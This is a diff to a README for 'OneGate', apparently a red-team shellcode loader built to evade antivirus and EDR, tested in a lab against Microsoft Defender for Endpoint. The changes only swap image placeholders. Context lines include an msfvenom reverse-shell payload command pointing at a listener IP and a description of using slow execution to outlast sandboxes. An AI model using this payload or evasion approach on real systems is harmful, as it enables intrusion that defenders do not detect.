@@ -2,7 +2,7 @@
 Yet another shellcode loader - but a sneaky one
 
 
-[insert humerous picture]
+<img src="./pictures/2_JS188188658-1141921000.jpg" alt="Image" width="400">
 
 
 This is a combination of my earlier shellcode obfuscation project WhenAPayloadCalls but now with a custom shellcode loader which aims to defeat antivirus and EDR solutions.
@@ -32,7 +32,7 @@ Using the Zydis (https://github.com/zyantific/zydis) it will iterate through the
 
 A sample output of the constructor is as follows:
 
-[insert sample output]
+<img src="./pictures/constructor.png" alt="Image" width="600">
 
 
 ### OneGate (the executor)
@@ -79,11 +79,12 @@ A better way to handle this could be just in time deobfuscation, where there is 
 
 This was tested in [Altered Security](https://www.alteredsecurity.com/)'s lab environment (shout out to Nikhil for letting me test it on there) which had a machine running Microsoft Defender for Endpoint (Microsoft's EDR solution). OneGate was infiltrated to the target machine and run from disk without using any sort of in memory PE loading techniques. Using the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.91 LPORT=9000` built on `notepad.exe` a reverse connection was successfully established to the listener machine.
 
-[insert picture]
+[placeholder_for_image]
 
 An analysis of the MDE dashboard shows only one detection by MDE which had to do with a compromised account and the dumping of a SAM hive (this was a shared environment so other people were doing other things). Of interest is the fact that MDE had flagged the `jumpone$` account shown in the picture below as being compromised - this was the same account used to sign in to deploy OneGate on the target machine meaning that even with a flagged account MDE did not detect the execution of the reverse shell.
 
-[insert MDE dashboard picture]
+
+<img src="./pictures/mde_dashboard.png" alt="Image" width="1000">
 
 
 While not definitive, it is believed that the fact that OneGate takes so long to run the shellcode helps with defeating AV/EDR sandboxing. Seeing as the AV/EDR cannot run OneGate in a sandbox forever, it runs it for however long it can and determines that nothing malicious is going on and lets it run in the production environment. The prevents the need for sandbox detection and evasion techniques to have to built into the loader which may be detected.
